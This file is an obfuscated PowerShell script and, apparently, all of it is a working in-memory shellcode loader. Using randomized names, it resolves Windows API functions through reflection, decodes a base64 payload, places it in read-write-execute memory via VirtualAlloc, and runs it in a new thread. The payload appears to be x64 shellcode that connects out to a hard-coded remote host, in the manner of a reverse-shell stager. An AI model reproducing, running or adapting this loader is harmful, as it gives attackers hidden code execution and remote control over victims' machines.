function k7 {
	Param ($wIB, $eYk)		
	$q8 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $q8.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($q8.GetMethod('GetModuleHandle')).Invoke($null, @($wIB)))), $eYk))
}

function g2U7 {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $w96Bt,
		[Parameter(Position = 1)] [Type] $eEa = [Void]
	)
	
	$iN9j7 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$iN9j7.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $w96Bt).SetImplementationFlags('Runtime, Managed')
	$iN9j7.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $eEa, $w96Bt).SetImplementationFlags('Runtime, Managed')
	
	return $iN9j7.CreateType()
}

[Byte[]]$s8d = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCACK4cNVjoEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$rZ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((k7 kernel32.dll VirtualAlloc), (g2U7 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $s8d.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($s8d, 0, $rZ, $s8d.length)

$tuy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((k7 kernel32.dll CreateThread), (g2U7 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$rZ,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((k7 kernel32.dll WaitForSingleObject), (g2U7 @([IntPtr], [Int32]))).Invoke($tuy,0xffffffff) | Out-Null
